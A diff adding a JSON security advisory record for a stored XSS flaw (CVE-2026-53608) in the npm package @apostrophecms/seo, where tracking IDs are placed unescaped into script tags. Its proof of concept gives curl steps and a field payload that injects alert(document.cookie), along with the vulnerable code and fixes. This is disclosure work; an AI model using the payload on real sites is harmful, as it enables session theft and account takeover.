@@ -1,0 +1,59 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-07-31T21:53:57Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@apostrophecms/seo"
+  },
+  "Advisory": {
+    "DatabaseId": 397270,
+    "Id": "GSA_kwCzR0hTQS13ZjQzLWZwcDMtY2Y2Nc4ABg_W",
+    "GhsaId": "GHSA-wf43-fpp3-cf65",
+    "References": [
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-wf43-fpp3-cf65"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-53608"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/pull/5464"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-wf43-fpp3-cf65"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-wf43-fpp3-cf65"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-53608"
+      }
+    ],
+    "Description": "\u003cimg width=\"1919\" height=\"1046\" alt=\"curl\" src=\"https://github.com/user-attachments/assets/8aa19ff1-7f4b-44ee-83d5-d0dd1a0269f6\" /\u003e\n\u003cimg width=\"1919\" height=\"775\" alt=\"xss\" src=\"https://github.com/user-attachments/assets/a65012e8-9b2f-416f-94df-c00493f2ca1d\" /\u003e\n\n### Summary\n\nThe `@apostrophecms/seo` package injects the Google Analytics Tracking ID (`seoGoogleTrackingId`) and Google Tag Manager ID (`seoGoogleTagManager`) directly into `\u003cscript\u003e` tag bodies using JavaScript template literals without any sanitization or validation.\n\nAny user with editor-level access (the default role for content managers) can set these fields to a malicious value, resulting in stored XSS that executes on every page for every visitor of the site.\n\n### Details\n\nThe vulnerable code is in `node_modules/@apostrophecms/seo/lib/nodes.js`.\n\n**Google Analytics (lines 218–224):**\n\n```javascript\n// seoGoogleTrackingId is inserted RAW into a \u003cscript\u003e body — no escaping, no validation\nbody: [ {\n  raw: `\n  window.dataLayer = window.dataLayer || [];\n  function gtag(){dataLayer.push(arguments);}\n  gtag('js', new Date());\n  gtag('config', '${global.seoGoogleTrackingId}');\n`\n} ]\n```\n\n**Google Tag Manager (lines 358–362):**\n\n```javascript\nbody: [ {\n  raw: `(function(w,d,s,l,i){...})(window,document,'script','dataLayer','${global.seoGoogleTagManager}');`\n} ]\n```\n\nThese nodes are rendered by `renderNodes()` in ApostropheCMS core (`modules/@apostrophecms/template/index.js` lines 1176–1177):\n\n```javascript\nif (node.raw != null) {\n  return node.raw;  // returned verbatim, no escaping\n}\n```\n\nThe fields `seoGoogleTrackingId` and `seoGoogleTagManager` are defined as plain `type: 'string'` values with no pattern, minimum length, or maximum length validation in `seo-fields-global/index.js` lines 347–352.\n\nApostropheCMS's permission model (`@apostrophecms/permission/index.js` line 121) grants editor-level users the ability to edit and publish the global singleton, meaning a contributor does not need administrator access to exploit this issue.\n\n### PoC\n\n**Prerequisites:** ApostropheCMS with `@apostrophecms/seo` installed and `seoGoogleAnalytics: true` enabled in module options. An editor-level account.\n\n#### Step 1 — Login as editor\n\n```bash\ncurl -s -X POST http://TARGET/api/v1/@apostrophecms/login/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"editor\",\"password\":\"password\"}'\n```\n\nResponse:\n\n```json\n{\"token\":\"YOUR_TOKEN\"}\n```\n\n#### Step 2 — Get the global document ID\n\n```bash\ncurl -s -H \"Authorization: Bearer YOUR_TOKEN\" \\\n  http://TARGET/api/v1/@apostrophecms/global\n```\n\nNote the `_id` value ending in `:en:draft`.\n\n#### Step 3 — Inject payload into Google Analytics ID\n\n```bash\ncurl -s -X PATCH \"http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID\" \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: Bearer YOUR_TOKEN\" \\\n  -d '{\"seoGoogleTrackingId\":\"G-FAKE'\"'\"'); alert(document.cookie); //\"}'\n```\n\n#### Step 4 — Publish\n\n```bash\ncurl -s -X POST \"http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID/publish\" \\\n  -H \"Authorization: Bearer YOUR_TOKEN\"\n```\n\n#### Step 5 — Visit any page\n\nThe injected payload appears in `\u003chead\u003e` and executes:\n\n```html\n\u003cscript\u003e\n  gtag('config', 'G-FAKE'); alert(document.cookie); //');\n\u003c/script\u003e\n```\n\n### Impact\n\nThis is a Stored Cross-Site Scripting (XSS) vulnerability.\n\nAny user with the editor role (the standard content management role in ApostropheCMS) can inject arbitrary JavaScript that executes for every visitor on every page of the site.\n\nImpact includes:\n\n- Session token theft of all visitors, including other editors and administrators\n- Full account takeover via stolen administrator cookies\n- Malware distribution, phishing overlays, or credential harvesting targeting site visitors\n- Persistent compromise, as the payload remains active until manually removed\n\n### Remediation\n\nValidate the tracking ID fields against their expected formats before storage, and escape values before inserting them into script bodies.\n\n```javascript\n// Validate format before accepting\nif (value \u0026\u0026 !/^(G-|UA-|GTM-)[A-Z0-9-]+$/i.test(value)) {\n  throw new Error('Invalid tracking ID format');\n}\n```\n\n```javascript\n// Use safeJsonForScript instead of raw template literals\nbody: [ { json: global.seoGoogleTrackingId } ]\n```\n\nOr:\n\n```javascript\n// Escape the value before insertion\nraw: `gtag('config', ${JSON.stringify(global.seoGoogleTrackingId)});`\n```\n\u003cimg width=\"1919\" height=\"775\" alt=\"xss\" src=\"https://github.com/user-attachments/assets/4f1d6708-093a-4f74-828b-937dbeab62e8\" /\u003e",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-31T21:53:56Z",
+    "Severity": "HIGH",
+    "Summary": "@apostrophecms/seo Vulnerable to Stored XSS via Unsanitized Google Analytics / GTM ID Injected into Script Tag",
+    "UpdatedAt": "2026-07-31T21:53:57Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.5.0"
+      },
+      "VulnerableVersionRange": "\u003c= 1.4.2"
+    }
+  ]
+}
